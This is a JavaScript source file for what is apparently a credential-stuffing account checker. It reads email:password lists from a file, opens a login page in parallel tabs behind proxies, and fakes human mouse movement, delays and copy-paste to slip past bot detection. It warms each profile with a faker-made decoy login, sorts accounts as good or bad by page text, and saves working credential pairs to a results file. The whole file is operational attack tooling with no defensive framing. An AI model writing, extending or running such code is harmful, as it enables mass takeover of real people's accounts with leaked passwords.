import fs from "node:fs/promises";
import fsSync from "node:fs";
import axios from 'axios';
import { logger } from "../utils/logger.js";
import Constants from "./Constants.js";
import HumanBehavior from "./HumanBehavior.js";
import FakeAccountGenerator from "./FakeAccountGenerator.js";
import PageHelpers from "./PageHelpers.js";

// ==================== AccountProcessor Class ====================
export default class AccountProcessor {
    constructor(client) {
        this.client = client;
        this.maxRetries = Constants.MAX_RETRIES;
        this.maxTimeoutRetries = Constants.MAX_TIMEOUT_RETRIES;
    }

    // ==================== Static Methods for File Operations ====================
    static async loadAccountBatch(batchSize = Constants.CONCURRENT_TABS) {
        try {
            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
                console.log(`❌ Accounts file not found: ${Constants.ACCOUNTS_FILE}`);
                return [];
            }

            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
            const lines = content
                .split("\n")
                .map((l) => l.trim())
                .filter(Boolean)
                .filter(line => line.includes(':') && line.split(':').length >= 2);

            console.log(`📊 Total accounts remaining in file: ${lines.length}`);

            if (!lines.length) {
                console.log("📄 No valid accounts found in file");
                return [];
            }

            const batch = lines.slice(0, Math.min(batchSize, lines.length));
            console.log(`📦 Selected batch of ${batch.length} accounts`);

            if (batch.length > 0) {
                const firstAccount = batch[0];
                const maskedAccount = firstAccount.replace(/(.{3}).*@/, '$1***@').replace(/:(.{2}).*/, ':$1***');
                console.log(`📋 First account in batch: ${maskedAccount}`);
            }

            return batch;

        } catch (err) {
            console.error("Error reading accounts file:", err.message);
            return [];
        }
    }

    static async removeProcessedAccounts(processedCount) {
        if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
            return;
        }

        const lines = (await fs.readFile(Constants.ACCOUNTS_FILE, "utf8"))
            .split("\n")
            .map((l) => l.trim())
            .filter(Boolean);

        const remaining = lines.slice(processedCount);

        if (remaining.length > 0) {
            await fs.writeFile(Constants.ACCOUNTS_FILE, remaining.join("\n") + "\n", "utf8");
        } else {
            await fs.writeFile(Constants.ACCOUNTS_FILE, "", "utf8");
        }
    }

    static async sendResultsToServer(results) {
        try {
            const resultsText = results.map(result => {
                const status = result.status === 'good' ? 'GOOD' : 'BAD';
                return `${result.email}:${result.password} - ${status}`;
            }).join('\n');

            await fs.appendFile(Constants.RESULTS_FILE, resultsText + '\n', 'utf8');
            console.log(`📊 Results saved to ${Constants.RESULTS_FILE}`);

        } catch (err) {
            console.error("Error sending results to server:", err.message);
        }
    }

    // ==================== Error Detection Methods ====================
    static isCriticalError(error) {
        const criticalPatterns = [
            'PROXY_CONNECTION_FAILED',
            'CONTEXT_DESTROYED',
            'net::ERR_EMPTY_RESPONSE',
            'net::ERR_CONNECTION_REFUSED',
            'net::ERR_PROXY_CONNECTION_FAILED',
            'net::ERR_TUNNEL_CONNECTION_FAILED'
        ];

        return criticalPatterns.some(pattern => 
            error.message && error.message.includes(pattern)
        );
    }

    static isProxyError(errorMessage) {
        const proxyErrorPatterns = [
            'net::ERR_PROXY_CONNECTION_FAILED',
            'net::ERR_TUNNEL_CONNECTION_FAILED',
            'PROXY_CONNECTION_FAILED',
            'Failed to determine external IP address',
            'HTTP 503'
        ];

        return proxyErrorPatterns.some(pattern => 
            errorMessage && errorMessage.includes(pattern)
        );
    }

    // ==================== Fake Account Processing ====================
    async processFakeAccount(context) {
        console.log("🎭 Processing fake account first to warm up the profile...");

        const fakeAccountLine = FakeAccountGenerator.generateFakeAccountLine();
        console.log(`🎭 Using faker-generated fake account: ${fakeAccountLine}`);

        let page = null;
        let retryCount = 0;

        while (retryCount < this.maxRetries) {
            try {
                page = await context.newPage();
                console.log(`🎭 Attempt ${retryCount + 1}/${this.maxRetries}: Loading page...`);

                await this._loadPageWithRetry(page, retryCount);
                break; // Success, exit retry loop

            } catch (gotoErr) {
                retryCount++;
                console.log(`🎭 Attempt ${retryCount}/${this.maxRetries} failed:`, gotoErr.message);

                if (page) {
                    try { await page.close(); } catch { }
                    page = null;
                }

                if (this._isCriticalConnectionError(gotoErr)) {
                    console.log("❌ Critical connection error detected");
                    throw new Error('PROXY_CONNECTION_FAILED');
                }

                if (retryCount < this.maxRetries) {
                    const waitTime = Constants.RETRY_BASE_DELAY * retryCount;
                    console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                    await HumanBehavior.sleep(waitTime);
                } else {
                    throw gotoErr;
                }
            }
        }

        await PageHelpers.waitFullLoadAndSettle(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(1000, 2000));
        await HumanBehavior.randomMouseMovements(page);

        const submitSelector = "button[type=submit]";

        // Email step with copy-paste
        console.log("🎭 Processing fake email with copy-paste method...");
        const emailFrame = await this._waitForEmailFrame(page);
        const emailInput = PageHelpers.emailLocator(emailFrame);
        const cutPassword = await this._humanPasteEmail(page, emailInput, fakeAccountLine);

        await PageHelpers.safeClickMayNavigate(page, emailFrame, submitSelector);

        // Password step with paste
        console.log("🎭 Pasting fake password...");
        const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 7500);
        const passInput = PageHelpers.passwordLocator(passFrame);

        await this._humanPastePassword(page, passInput, cutPassword);
        await PageHelpers.safeClickMayNavigate(page, passFrame, submitSelector);

        // Wait and check results
        await HumanBehavior.sleep(HumanBehavior.randomDelay(2000, 3000));
        const bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (bodyText.includes(`Can't connect to the server`)) {
            throw new Error('SERVER_CONNECTION_FAILED');
        }

        console.log("🎭 Fake account process completed (expected to fail)");

        // Save used fake account
        const fakeAccountLogLine = `${fakeAccountLine}\n`;
        await fs.appendFile('./fake_accounts_used.txt', fakeAccountLogLine, "utf8");

        try {
            if (page) await page.close();
        } catch { }

        console.log("🎭 Fake account warming completed. Now starting real accounts...");
    }

    async _loadPageWithRetry(page, retryCount) {
        try {
            await page.goto(Constants.LOGIN_URL, {
                waitUntil: "networkidle",
                timeout: 30000
            });
            console.log("✅ Page loaded with networkidle");
        } catch (networkIdleErr) {
            console.log("⚠️ NetworkIdle failed, trying with domcontentloaded...");
            try {
                await page.goto(Constants.LOGIN_URL, {
                    waitUntil: "domcontentloaded",
                    timeout: 20000
                });
                console.log("✅ Page loaded with domcontentloaded");
            } catch (domErr) {
                console.log("⚠️ DOMContentLoaded failed, trying basic load...");
                await page.goto(Constants.LOGIN_URL, {
                    waitUntil: "load",
                    timeout: 25000
                });
                console.log("✅ Page loaded with basic load");
            }
        }
    }

    _isCriticalConnectionError(error) {
        const criticalErrors = [
            'net::ERR_EMPTY_RESPONSE',
            'net::ERR_CONNECTION_REFUSED',
            'net::ERR_PROXY_CONNECTION_FAILED',
            'net::ERR_TUNNEL_CONNECTION_FAILED'
        ];

        return criticalErrors.some(pattern => 
            error.message && error.message.includes(pattern)
        );
    }

    async _waitForEmailFrame(page) {
        try {
            return await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 15000);
        } catch (frameErr) {
            console.log("🎭 Email frame not found:", frameErr.message);

            if (frameErr.message.includes('Execution context was destroyed') ||
                frameErr.message.includes('Frame with selector') ||
                frameErr.message.includes('navigation')) {
                throw new Error('CONTEXT_DESTROYED');
            }

            throw frameErr;
        }
    }

    // ==================== Real Account Processing ====================
    async processAccount(context, accountLine, tabIndex, accountsCount, abortSignal = null) {
        let page = null;
        let timeoutRetryCount = 0;
        const startTime = Date.now();

        try {
            logger.info(`🚀 Tab ${tabIndex + 1}: Starting login for ${accountLine}`);
            const email = accountLine.split(':')[0];

            let finalResult = null;

            while (timeoutRetryCount <= this.maxTimeoutRetries && !finalResult) {
                try {
                    if (abortSignal?.aborted) {
                        throw new Error('Operation aborted');
                    }

                    await HumanBehavior.sleep(HumanBehavior.randomDelay(50, 250));
                    page = await context.newPage();

                    // Set unique viewport for each tab
                    await page.setViewportSize({
                        width: 1200 + (tabIndex * 50),
                        height: 800 + (tabIndex * 30)
                    });

                    logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${timeoutRetryCount + 1}/${this.maxTimeoutRetries + 1})...`);

                    const loadSuccess = await this._loadLoginPage(page, tabIndex);
                    if (!loadSuccess) {
                        throw new Error('Page load failed after multiple attempts');
                    }

                    await PageHelpers.waitFullLoadAndSettle(page);

                    const result = await this._performLogin(page, accountLine, tabIndex, startTime);
                    finalResult = result;

                } catch (retryErr) {
                    logger.error(`❌ Tab ${tabIndex + 1}: Error during retry ${timeoutRetryCount} for ${email}: ${retryErr.message}`);

                    if (timeoutRetryCount >= this.maxTimeoutRetries) {
                        finalResult = {
                            email,
                            status: 'error',
                            error: retryErr.message,
                            responseTime: Date.now() - startTime,
                            tabIndex,
                            retryCount: timeoutRetryCount
                        };
                        break;
                    } else {
                        timeoutRetryCount++;
                        await HumanBehavior.sleep(2000 + HumanBehavior.randomDelay(1000, 2000));
                    }
                }
            }

            return finalResult;

        } catch (err) {
            logger.error(`❌ Tab ${tabIndex + 1}: Error processing ${accountLine}: ${err.message}`);

            return {
                email: accountLine.split(':')[0],
                status: 'server-error',
                error: err.message,
                responseTime: Date.now() - startTime,
                tabIndex
            };
        } finally {
            try {
                if (page) {
                    logger.info(`🧹 Tab ${tabIndex + 1}: Closing page...`);
                    await page.close();
                }
            } catch (closeErr) {
                logger.error(`Tab ${tabIndex + 1}: Page close error: ${closeErr.message}`);
            }
        }
    }

    async _loadLoginPage(page, tabIndex) {
        const maxAttempts = 3;
        
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            try {
                logger.info(`📄 Tab ${tabIndex + 1}: Load attempt ${attempt}/${maxAttempts}`);

                await page.goto(Constants.LOGIN_URL, {
                    waitUntil: "domcontentloaded",
                    timeout: 25000
                });

                const success = await PageHelpers.waitForPageContent(
                    page,
                    "Sign in",
                    20000,
                    `${tabIndex + 1}`
                );

                if (success) {
                    logger.info(`✅ Tab ${tabIndex + 1}: Page loaded successfully on attempt ${attempt}`);
                    return true;
                }

                if (attempt < maxAttempts) {
                    logger.warn(`⚠️ Tab ${tabIndex + 1}: Attempt ${attempt} failed, retrying...`);
                    await HumanBehavior.sleep(2000 * attempt);
                }

            } catch (loadErr) {
                logger.error(`❌ Tab ${tabIndex + 1}: Load attempt ${attempt} error: ${loadErr.message}`);
                
                if (attempt < maxAttempts) {
                    await HumanBehavior.sleep(3000 * attempt);
                }
            }
        }

        logger.error(`❌ Tab ${tabIndex + 1}: All load attempts failed`);
        return false;
    }

    async _performLogin(page, accountLine, tabIndex, startTime) {
        const [email, password] = accountLine.split(':');
        
        try {
            // Email step
            logger.info(`📧 Tab ${tabIndex + 1}: Processing email step...`);
            const emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 15000);
            const emailInput = PageHelpers.emailLocator(emailFrame);
            
            await this._humanPasteEmail(page, emailInput, accountLine);
            await PageHelpers.safeClickMayNavigate(page, emailFrame, "button[type=submit]");

            // Password step
            logger.info(`🔑 Tab ${tabIndex + 1}: Processing password step...`);
            const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 10000);
            const passInput = PageHelpers.passwordLocator(passFrame);
            
            await this._humanPastePassword(page, passInput, password);
            await PageHelpers.safeClickMayNavigate(page, passFrame, "button[type=submit]");

            // Wait for result
            await HumanBehavior.sleep(HumanBehavior.randomDelay(3000, 5000));
            
            return await this._analyzeLoginResult(page, email, password, tabIndex, startTime);

        } catch (loginErr) {
            logger.error(`❌ Tab ${tabIndex + 1}: Login process error: ${loginErr.message}`);
            
            return {
                email,
                status: 'error',
                error: loginErr.message,
                responseTime: Date.now() - startTime,
                tabIndex
            };
        }
    }

    async _analyzeLoginResult(page, email, password, tabIndex, startTime) {
        try {
            const bodyText = await page.evaluate(() => document.body?.innerText || "");
            const currentUrl = page.url();
            const responseTime = Date.now() - startTime;

            logger.info(`🔍 Tab ${tabIndex + 1}: Analyzing result for ${email}`);

            // Check for success indicators
            if (this._isLoginSuccessful(bodyText, currentUrl)) {
                logger.info(`✅ Tab ${tabIndex + 1}: SUCCESS - ${email}`);
                return {
                    email,
                    password,
                    status: 'good',
                    responseTime,
                    tabIndex,
                    url: currentUrl
                };
            }

            // Check for server errors
            if (this._isServerError(bodyText)) {
                logger.error(`🚨 Tab ${tabIndex + 1}: SERVER ERROR - ${email}`);
                return {
                    email,
                    password,
                    status: 'server-error',
                    error: 'Server connection failed',
                    responseTime,
                    tabIndex,
                    shouldExit: true
                };
            }

            // Default to bad credentials
            logger.info(`❌ Tab ${tabIndex + 1}: BAD CREDENTIALS - ${email}`);
            return {
                email,
                password,
                status: 'bad',
                responseTime,
                tabIndex
            };

        } catch (analysisErr) {
            logger.error(`❌ Tab ${tabIndex + 1}: Analysis error: ${analysisErr.message}`);
            
            return {
                email,
                password,
                status: 'error',
                error: analysisErr.message,
                responseTime: Date.now() - startTime,
                tabIndex
            };
        }
    }

    _isLoginSuccessful(bodyText, currentUrl) {
        const successIndicators = [
            'Account Management',
            'Profile Settings',
            'Security Settings',
            'Privacy Settings'
        ];

        const urlIndicators = [
            '/account/management',
            '/profile',
            '/settings'
        ];

        return successIndicators.some(indicator => bodyText.includes(indicator)) ||
               urlIndicators.some(indicator => currentUrl.includes(indicator));
    }

    _isServerError(bodyText) {
        const serverErrorIndicators = [
            "Can't connect to the server",
            "The connection to the server timed out",
            "device sent too many requests",
            "Server Error",
            "Internal Server Error",
            "Service Unavailable"
        ];

        return serverErrorIndicators.some(indicator => bodyText.includes(indicator));
    }

    // ==================== Copy-Paste Helper Methods ====================
    async _humanPasteEmail(page, locator, fullAccountLine) {
        await locator.waitFor({ state: "visible" });

        await HumanBehavior.hoverElement(page, 'input[type="email"]');
        await HumanBehavior.humanClick(page, 'input[type="email"]');

        console.log("📋 Pasting full account line into email field...");

        await locator.fill('');
        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 3000));
        await locator.fill(fullAccountLine);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));

        const lastColonIndex = fullAccountLine.lastIndexOf(':');
        if (lastColonIndex === -1) {
            throw new Error("Invalid account format - no colon found");
        }

        const password = fullAccountLine.substring(lastColonIndex + 1);

        console.log("✂️ Step 1: Cutting password part from email field...");

        await locator.press('End', { delay: HumanBehavior.randomDelay(50, 100) });

        const passwordLength = password.length;
        for (let i = 0; i < passwordLength; i++) {
            await locator.press('Shift+ArrowLeft', { delay: HumanBehavior.randomDelay(25, 50) });
        }

        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 250));
        await locator.press('Control+x', { delay: HumanBehavior.randomDelay(100, 150) });

        console.log(`✂️ Password "${password}" cut from email field`);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));

        console.log("🗑️ Step 2: Deleting colon (:) from email field...");
        await locator.press('Backspace', { delay: HumanBehavior.randomDelay(150, 250) });
        await HumanBehavior.sleep(HumanBehavior.randomDelay(300, 500));

        console.log("✅ Email field cleaned - only email remains");
        return password;
    }

    async _humanPastePassword(page, locator, password) {
        await locator.waitFor({ state: "visible" });

        await HumanBehavior.hoverElement(page, 'input[type="password"]');
        await HumanBehavior.humanClick(page, 'input[type="password"]');

        console.log(`📋 Pasting password: ${password}`);

        await locator.fill('');
        await HumanBehavior.sleep(HumanBehavior.randomDelay(100, 200));
        await locator.fill(password);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(250, 400));

        console.log("✅ Password pasted successfully");
    }
}